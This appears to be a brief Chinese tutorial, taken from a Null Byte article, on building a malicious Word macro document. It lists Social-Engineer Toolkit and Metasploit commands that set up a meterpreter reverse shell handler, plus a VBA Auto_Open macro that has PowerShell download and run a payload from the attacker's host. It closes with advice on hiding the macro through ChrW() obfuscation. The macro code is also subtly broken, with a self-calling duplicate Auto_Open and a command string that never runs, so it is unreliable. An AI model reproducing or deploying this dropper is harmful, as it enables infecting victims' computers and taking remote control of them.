## 在Microsoft Word文档中创建和混淆病毒

`setoolkit`

`1 9 1`

`mv /root/.set/reports/powershell/x86_powershell_injection.txt /var/www/html/payload.txt`

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.103
set lport 4444
exploit
```

```visual basic
# 创建Microsoft Word文档并命名为Evil.docm
# 创建宏并插入VBA脚本
Sub Auto_Open()
    Dim exec As String
    exec = "powershell.exe""IEX ((new-object net.webclient).downloadstring('http://192.168.1.103/payload.txt'))"""
End Sub
Sub Auto_Open()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
# 注意PowerShell命令中的双引号; Visual Basic中的转义字符只是键入两次字符
```

```
# 使用ChrW() 混淆VBA脚本,允许我们键入ASCII字符值而不是实际字符本身
# 自动化程序 http://pastebin.com/bD6xEP9a
```

[原文](https://null-byte.wonderhowto.com/how-to/create-obfuscate-virus-inside-microsoft-word-document-0167780/)

